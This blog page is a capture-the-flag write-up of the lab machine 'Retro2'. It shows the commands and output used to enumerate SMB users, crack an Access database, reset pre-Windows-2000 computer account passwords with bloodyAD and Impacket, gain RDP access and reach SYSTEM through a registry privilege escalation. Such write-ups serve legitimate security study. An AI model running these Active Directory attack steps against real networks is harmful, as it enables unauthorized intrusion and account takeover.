<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Retro2 (Windows Easy) | SidePieceVillage</title><meta name="author" content="Jay"><meta name="copyright" content="Jay"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content=" Retro2 is a Easy Windows machine, that starts off with Guest auth enabled to look at shares finding a Microsoft Access Database file. After..."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Retro2 (Windows Easy)",
  "url": "https://d34db33fb04h.github.io/2025/04/05/Retro2/",
  "image": "https://d34db33fb04h.github.io/img/retro2.jpg",
  "datePublished": "2025-04-05T17:02:02.000Z",
  "dateModified": "2025-05-10T16:57:07.363Z",
  "author": [
    {
      "@type": "Person",
      "name": "Jay",
      "url": "https://d34db33fb04h.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/j-neon-oval.png"><link rel="canonical" href="https://d34db33fb04h.github.io/2025/04/05/Retro2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Retro2 (Windows Easy)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li><li><a class="site-page child" href="/categories/hacksmarter/"><i class="fa-fw fa-solid fa-computer"></i><span> HackSmarter</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/n8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/j-neon-oval.png" alt="Logo"><span class="site-name">SidePieceVillage</span></a><a class="nav-page-title" href="/"><span class="site-name">Retro2 (Windows Easy)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li><li><a class="site-page child" href="/categories/hacksmarter/"><i class="fa-fw fa-solid fa-computer"></i><span> HackSmarter</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Retro2 (Windows Easy)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-04-05T17:02:02.000Z" title="Created 2025-04-05 12:02:02">2025-04-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-05-10T16:57:07.363Z" title="Updated 2025-05-10 11:57:07">2025-05-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/vl/">vl</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/img/retro2.jpg"></p>
<p>Retro2 is a Easy Windows machine, that starts off with <code>Guest</code> auth enabled to look at shares finding a Microsoft Access Database file. After finding the user and password we are able to obtain a bloodhound dump. This shows a relatively simple path with some twists, we are able to find a couple of <code>Pre-Windows</code> machine and change the password for one. Allowing us to change&#x2F;reset the password for the computer <code>ADMWS01$</code> which has a particular attribute that allows the reset of the password. Once we‚Äôve done this we are able to add our user to the <code>Services</code> group allowing for RDP access. Upon getting a session we find that with the version of Windows Server 2008 we are able to control the full path to a windows registry value that allows us to escalate to <code>NT AUTHORITY\SYSTEM</code>.</p>
<h1 id="Initial-Nmap"><a href="#Initial-Nmap" class="headerlink" title="Initial Nmap"></a>Initial Nmap</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)</span><br><span class="line">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-08 15:45:22Z)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1</span><br><span class="line">|   Computer name: BLN01</span><br><span class="line">|   NetBIOS computer name: BLN01\x00</span><br><span class="line">|   Domain name: retro2.vl</span><br><span class="line">|   Forest name: retro2.vl</span><br><span class="line">|   FQDN: BLN01.retro2.vl</span><br><span class="line">|_  System time: 2024-11-08T16:46:17+01:00</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-11-08T15:46:14</span><br><span class="line">|_  start_date: 2024-11-08T15:44:30</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2:1:0:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 47m06s, deviation: 34m35s, median: 1h07m04s</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 08:39</span><br><span class="line">Completed NSE at 08:39, 0.00s elapsed</span><br><span class="line">Initiating NSE at 08:39</span><br><span class="line">Completed NSE at 08:39, 0.00s elapsed</span><br><span class="line">Initiating NSE at 08:39</span><br><span class="line">Completed NSE at 08:39, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 109.68 seconds</span><br><span class="line">           Raw packets sent: 1990 (87.536KB) | Rcvd: 17 (732B)</span><br></pre></td></tr></table></figure>

<h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><p>Found LOTS users via brute forcing.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ smb retro2.vl -u jay -p &#x27;&#x27; --rid-brute  | tr -s &quot; &quot; | awk -F&#x27;\&#x27; &#x27;&#123;print $2&#125;&#x27; | awk &#x27;&#123;print $1&#125;&#x27; &gt; users.lst</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">Julie.Martin</span><br><span class="line">Clare.Smith</span><br><span class="line">Laura.Davies</span><br><span class="line">Rhys.Richards</span><br><span class="line">Leah.Robinson</span><br><span class="line">Michelle.Bird</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
<p>Found MS Access Database. </p>
<p><img src="/img/officedb.png"></p>
<p>This file was password protected, so converting using <em>office2john</em> and cracking got us in and found creds.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">strLDAP = &quot;LDAP://OU=staff,DC=retro2,DC=vl&quot;</span><br><span class="line">strUser = &quot;retro2\ldapreader&quot;</span><br><span class="line">strPassword = &quot;&lt;SNIP&gt;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>Now we can get a bloodhound dump and look at our attack path. From there the path is relatively simple. We can use <code>FS01$</code> or <code>FS02$</code>. I‚Äôm using <code>FS01$</code>.<br><img src="/img/bloodhound.png"></p>
<p>Seeing as <code>Pre-Windows</code> machines use the same password as their hostname, we can check to see if we have an error that indicates a password change is needed. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb retro2.vl -u &#x27;FS01$&#x27; -p fs01                                                                                         </span><br><span class="line">SMB         10.10.106.109   445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)</span><br><span class="line">SMB         10.10.106.109   445    BLN01            [-] retro2.vl\FS01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</span><br></pre></td></tr></table></figure>
<p>As we didn‚Äôt get a <code>STATUS_LOGON_FAILURE</code>, the password for this machine can be reset. We can use <code>bloodyAD</code> to set his password.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./bloodyAD.py -v DEBUG --dc-ip 10.10.106.109 --host retro2.vl -d retro2.vl -u &#x27;ldapreader&#x27; -p &#x27;&lt;SNIP&gt;&#x27; set password &#x27;FS01$&#x27; &#x27;Password123!&#x27; --oldpass fs01 </span><br><span class="line">[*] Trying to connect to retro2.vl...</span><br><span class="line">[+] Connection successful</span><br><span class="line">[+] Password changed successfully!</span><br></pre></td></tr></table></figure>

<p>There are 3 ways to abuse the <code>GenericWrite</code> permission:</p>
<ul>
<li>Shadow Credentials (applicable with Windows Server 2016  and later)</li>
<li>Targeted Kerberoasting(affective if your targets password is weak and crackable)</li>
<li>Resource-Based Constrained Delegation</li>
</ul>
<p>None of which will work on this 2008 machine. üòí</p>
<p>Yet the Windows Server 2008 has an attribute, which if writable we can perform a password reset of <code>ADMWS01$</code> Computer. This <a target="_blank" rel="noopener" href="https://windowstechno.com/unicodepwd/">article</a> explains some context.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ ./bloodyAD.py -v DEBUG --dc-ip 10.10.102.10 --host retro2.vl -d retro2.vl -u &#x27;FS01$&#x27; -p &#x27;Password123!&#x27; get writable --otype COMPUTER --detail                                                                                    </span><br><span class="line">[*] Trying to connect to retro2.vl... </span><br><span class="line">[+] Connection successful </span><br><span class="line">distinguishedName: CN=ADMWS01,CN=Computers,DC=retro2,DC=vl</span><br><span class="line">serviceInstance: CREATE_CHILD</span><br><span class="line">applicationVersion: CREATE_CHILD</span><br><span class="line">ms-net-ieee-80211-GroupPolicy: CREATE_CHILD</span><br><span class="line">rpcProfile: CREATE_CHILD</span><br><span class="line">rpcProfileElement: CREATE_CHILD </span><br><span class="line">msieee80211-Policy: CREATE_CHILD </span><br><span class="line">serviceAdministrationPoint: CREATE_CHILD   </span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">ntPwdHistory: WRITE</span><br><span class="line">otherLoginWorkstations: WRITE</span><br><span class="line">unicodePwd: WRITE &lt;-----</span><br><span class="line">userWorkstations: WRITE</span><br><span class="line">maxStorage: WRITE</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
<p>With the attribute writable, we can change&#x2F;reset the password for <code>ADMWS01$</code>. I found it difficult to do with <code>bloodyAD</code> but I used <code>changepassword.py</code> from Impacket that got the job done.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ changepasswd.py -dc-ip 10.10.102.10 -altuser &#x27;FS01$&#x27; -altpass &#x27;Password123!&#x27; -newpass &#x27;Password123!&#x27; -p rpc-samr &#x27;retro2.vl/ADMWS01$@retro2.vl&#x27; -reset -admin</span><br><span class="line"> Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Setting the password of retro2.vl\ADMWS01$ as retro2.vl\FS01$</span><br><span class="line">[*] Connecting to DCE/RPC as retro2.vl\FS01$</span><br><span class="line">[*] Password was changed successfully.</span><br><span class="line">[!] User no longer has valid AES keys for Kerberos, until they change their password again.</span><br></pre></td></tr></table></figure>
<p>Once we‚Äôve done this, we can add <code>ldapreader</code> to the <code>Services</code> group which will allow him to RDP to the machine.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./bloodyAD.py -v DEBUG --dc-ip 10.10.102.10 --host retro2.vl -d retro2.vl -u &#x27;ADMWS01$&#x27; -p &#x27;Password123!&#x27; add groupMember &#x27;Services&#x27; &#x27;ldapreader&#x27;</span><br><span class="line">[*] Trying to connect to retro2.vl...</span><br><span class="line">[+] Connection successful</span><br><span class="line">[+] ldapreader added to Services</span><br></pre></td></tr></table></figure>
<p><img src="/img/yes.gif"></p>
<h2 id="Session-as-ldapreader"><a href="#Session-as-ldapreader" class="headerlink" title="Session as ldapreader"></a>Session as ldapreader</h2><p>We can get a session going via RDP.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xfreerdp /v:retro2.vl /u:ldapreader /p:&lt;SNIP&gt; /tls-seclevel:0 +clipboard /dynamic-resolution</span><br></pre></td></tr></table></figure>

<p>I looked around and did some research about Windows Server 2008 R2, finding some articles but I came across something of a <code>no fix</code> by <a target="_blank" rel="noopener" href="https://itm4n.github.io/windows-registry-rpceptmapper-exploit/">itm4n</a>. Explaining that using <code>Get-WmiObject Win32_Perf</code> can query the <em>Performance counters</em> of the machine and when doing so the WMI service <strong>should</strong> load a specified DLL that gets us <code>NT AUTHORITY\SYSTEM</code>. </p>
<p><img src="/img/great.gif"></p>
<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><p>Once downloading the repo, and compiling, we can transfer it over to the machine and execute it. </p>
<p><img src="/img/perf.png"></p>
<p><img src="/img/robocop.gif"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pre-Windows-2000/">Pre-Windows 2000</a><a class="post-meta__tags" href="/tags/SMB/">SMB</a><a class="post-meta__tags" href="/tags/No-Fix-RPC/">No-Fix RPC</a></div><div class="post-share"><div class="social-share" data-image="/img/retro2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/04/06/Heist/" title="Heist (Windows Easy)"><img class="cover" src="/img/heist.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Heist (Windows Easy)</div></div><div class="info-2"><div class="info-item-1"> Heist is a Windows Easy box, I wanted to take it easy and doing something relaxing and this was very interesting to say the least. This starts out with a website that you‚Äôre able to login as a guest and read the recent posts. When you do you gather a user name, as well as see an attachment. This attactment is a cisco config file. You‚Äôre able to deduce what type of hash the passwords are and crack them. From there your able to get a list of users, and then spray to find one allows for winrm access. Upon looking a directories and anything from the norm, you find processes running and a particular firefox is running, which can allow for dumping the process memory if its still being used. Using procdump64.exe, we‚Äôre able to dump the process memory and filter through and retrieve the Administrator password. Initial Nmap12345678910111213141516171819202122232425262728293031PORT    STATE SERVICE       REASON          VERSION80/tcp  open  http          syn-ack ttl 127 Microsoft IIS httpd...</div></div></div></a><a class="pagination-related" href="/2025/04/01/Scrambled/" title="Scrambled (Windows Medium)"><img class="cover" src="/img/scrambled.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Scrambled (Windows Medium)</div></div><div class="info-2"><div class="info-item-1"> Scrambled is a Medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user ksimpson. On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the Public share with the credentials of ksimpson, a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine. Enumerating the normal user accounts, it is found that the account SqlSvc has a Service Principal Name (SPN) associated with it. An attacker can use this information to perform an attack that is knows as kerberoasting and get the hash of SqlSvc. After cracking the hash and acquiring the credentials for the SqlSvc account an attacker can perform a silver ticket attack to forge a ticket and impersonate the user Administrator on the remote MSSQL service. Enumeration...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jay</div><div class="author-info-description">An aspiring hacker and a CTF player</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/itzgottabejay" target="_blank" title="Github"><i class="fab fa-github" style="color: #E2E6E6;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/ianberdahl/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #007aff;"></i></a><a class="social-icon" href="https://app.hackthebox.com/profile/420575" target="_blank" title="HackTheBox"><i class="fa-solid fa-cube" style="color: #2dfc04;"></i></a><a class="social-icon" href="https://www.instagram.com/junkie_mayhem/" target="_blank" title="Instagram"><i class="fab fa-instagram" style="color: #833AB4;"></i></a><a class="social-icon" href="https://x.com/deadcyberninja" target="_blank" title="X"><i class="fab fa-x-twitter" style="color: #000404;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I like to put things here for safe keeping üîêüîê</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Initial-Nmap"><span class="toc-number">1.</span> <span class="toc-text">Initial Nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SMB"><span class="toc-number">2.</span> <span class="toc-text">SMB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound"><span class="toc-number">2.0.1.</span> <span class="toc-text">BloodHound</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Session-as-ldapreader"><span class="toc-number">2.1.</span> <span class="toc-text">Session as ldapreader</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">2.2.</span> <span class="toc-text">PrivEsc</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/n8.jpg);"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="IM,WATCHING,YOU" data-fontsize="21px" data-random="false" async="async"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Where do you want to go?" type="text"/></div></div><hr/><div 